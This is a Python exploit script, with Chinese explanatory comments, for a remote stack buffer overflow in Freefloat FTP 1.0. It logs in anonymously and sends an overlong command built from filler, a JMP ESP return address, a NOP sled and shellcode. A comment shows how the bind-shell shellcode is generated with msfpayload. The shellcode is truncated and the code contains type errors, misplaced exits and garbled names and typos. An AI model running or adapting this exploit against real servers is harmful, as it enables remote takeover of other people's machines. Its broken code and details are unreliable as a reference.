#!/usr/bin/python
# -*- coding:utf-8 -*-
# 基于栈的缓冲区溢出攻击
# 添加攻击的关键元素
# 利用基于栈的缓冲区溢出的基本术语
#   溢出：用户的输入长度超出栈中对它最大长度的预期，即分配的内存大小
#   返回地址：用于直接天跳转到栈顶部的 4B 的地址
#   Padding：在 shellcode 之前的一系列 NOP（无操作）的指令，它使攻击者预估直接跳转到那里去的地址时，能放宽的精度要求
#   shellcode：一小段用汇编语言编写的机器码
import socket
import sys
import time
import struct


if len(sys.argv) < 2:
    print("[-]Usage:%s <target addr> <command>" % sys.argv[0] + "\r")
    print("[-]For example [filename.py 192.168.0.1 PWND] would do the trick.")
    print("[-]Other options: AUTH, APPE, ALLO, ACCT")
    sys.exit(0)
target = sys.argv[1]
command = sys.argv[2]
if len(sys.argv) > 2:
    platform = sys.argv[2]
# ./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikate_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
shellcodde = "\xbf\x5c..."
# 7c874413 FFE4 JMP EXP jerbel132.dll
ret = struct.pack('<L', 0x7c874413)
padding = "\x90" + 150
crash = "\x41" + 246 + ret + padding + shellcodde
print("""
[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow\n
[*] Author: Craing Freyman (@cdlzz)\n
[*] Connecting to """ + target)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, 21))
except:
    print("[-] Connection to " + target + " failed!")
sys.exit(0)
print("[*] Sending " + len(crash) + " " + command + " byte crash...")
s.send("USER anonymous \r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command + " " + crash + "\r\n")
time.sleep(4)



















